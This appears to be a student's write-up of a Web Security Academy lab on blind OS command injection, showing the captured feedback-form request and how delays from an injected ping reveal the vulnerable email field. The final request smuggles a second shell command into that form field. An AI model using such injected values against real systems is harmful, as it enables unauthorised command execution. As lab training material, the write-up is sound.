# Lab - 02

Topic :  ****Blind OS command injection with time delays

Concept:  In Blind OS Injection the output is not shown, so to find the vuln, we use time delays using `sleep` or using `ping` to the local server

End Goal : Finding the parameter vuln to OS command injection

Analysis : 

- It is already said that the vuln is in the feedback form.
- Burp request for the form…

```
POST /feedback/submit HTTP/2
Host: 0a6400b603e88b94814eb13f0019004a.web-security-academy.net
Cookie: session=ImTRvbMoH7mM6pZOAMkG7PH9LUT2Xgp4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Origin: https://0a6400b603e88b94814eb13f0019004a.web-security-academy.net
Referer: https://0a6400b603e88b94814eb13f0019004a.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=C7Svere75Ci3Oa6ZmV2zfXxcSabOEMxt&name=qw&email=qw%40qw.com&subject=qw&message=qwerty
```

- This has the parameters
    - csrf(token) → can’t fuzz
    - name
    - email
    - subject
    - message
- We suffix each of these parameters with `& ping -c 10 127.0.0.1 #`[url encoded]
    - We comment out the rest of the code because we don’t want it to call anything else, it may cause an error.
- We see that the email parameter takes the longest time.
- However 10 pings do it in less than 10 seconds. So we do 11 pings to make it over 10 seconds.
- Final request

```

csrf=RQwe4grZcGJ94oxcdehTvNr0ySryKNpy&name=q&email=qw%40gmail.com%20%26%20ping%20-c%2011%20127.0.0.1%20%23&subject=qw&message=qw
```

- This takes a bit more than 10 seconds and our job is done.